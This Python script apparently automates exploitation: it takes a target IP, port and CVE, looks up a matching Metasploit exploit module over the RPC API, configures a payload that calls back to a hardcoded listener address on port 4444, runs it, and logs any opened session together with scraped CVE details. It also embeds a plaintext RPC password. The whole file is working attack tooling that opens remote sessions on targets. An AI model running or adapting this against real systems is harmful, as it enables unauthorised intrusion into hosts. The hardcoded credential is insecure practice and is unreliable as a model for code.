from pymetasploit3.msfrpc import *
from arg import process_parser
import pymysql
import sys
import json
import requests
from bs4 import BeautifulSoup as bs

alert_infos = []

def getCvesDescrip(cve): 
    url = "https://www.cvedetails.com/cve/" + cve
    cvePage = requests.get(url)
    cveSoup = bs(cvePage.text , 'html.parser')
    ##get cve description
    #no this cve info
    if cveSoup.find('div','errormsg') != None:
        print("page not found")
        return None
    cveDescription = str(cveSoup.find("div" , "cvedetailssummary")).replace('<div class="cvedetailssummary">' , "").strip()
    pos = cveDescription.index("<br/>")
    cveDescription = cveDescription[0 : pos]

    cveScore = float(cveSoup.find("div" , "cvssbox").string)
    
    cveInfo = {"cve":cve,"description":cveDescription,"cvss":cveScore}
    return cveInfo

def exploit_product(prod_info):
    #connnect to msfconcole
    client = MsfRpcClient('a407410040',port=55552)

    #1. search module
    cve = 'cve:' + prod_info["cve"]
    cve_modules = client.modules.search(cve)
    
    #check modules empty or not
    if len(cve_modules) == 0:
        print("no session for no corresponding modules")
        return
    module_fullname = cve_modules[0]["fullname"]
    if module_fullname.split('/')[0] != 'exploit':
        return
    module = '/'.join(module_fullname.split('/')[1:])
    #print(module)
    
    #2. set module
    exploit = client.modules.use('exploit',module)
    #print(exploit.missing_required)
    if "RHOSTS" in exploit.missing_required:
        exploit['RHOSTS'] = prod_info["ip"]
        exploit['RPORT'] = prod_info["port"]
    elif "SESSION" in exploit.missing_required:
        print("no session for session filter missing")
        return

    #3. set payload
    #check payload empty or not
    if len(exploit.payloads) == 0:
        print("no session for no useful payload")
        return
    
    p = exploit.payloads[0]
    payload = client.modules.use('payload',p)
    #print(payload.missing_required)
    if 'LHOST' in payload.missing_required:
        payload['LHOST'] = '140.123.230.32'
        payload['LPORT'] = 4444

    f = open("/var/www/html/ccu_proj_manyPorts/api/exploit/record_uni.txt","w")
    f.write(prod_info["ip"]+" " + prod_info["port"] + " "  + prod_info["cve"]+"\n")
    f.close()

    #4. connect to console
    console_id = client.consoles.console().cid
    console = client.consoles.console(console_id)
    output = console.run_module_with_output(exploit,payload=payload)
   
    session = 0
    f = open("/var/www/html/ccu_proj_manyPorts/www/alert.json","w")
    if 'session' in output:
        if 'open' in output:
            cveInfo = getCvesDescrip(prod_info["cve"])
            info = {
                "ip" : prod_info["ip"],
                "port" : prod_info["port"],
                "cve" : prod_info["cve"],
                "cvss" : cveInfo["cvss"],
                "description" : cveInfo["description"]
            }
            alert_infos.append(info)
            session = 1

    if session == 1:
        print("session open")
    else:
        print("no session for not found")

    json.dump(alert_infos,f)
    f.close() 
    

if __name__ == "__main__":
    
    if(len(sys.argv)!=4):
        exit()
    info = dict()
    info["ip"] = sys.argv[1]
    info["cve"] = sys.argv[2]
    info["port"] = sys.argv[3]
    '''
    #test
    info = dict()
    info["ip"] = '140.123.230.32'
    info["port"] = '8080'
    info["cve"] = 'CVE-2017-17562'
    print(info)
    '''
    exploit_product(info)
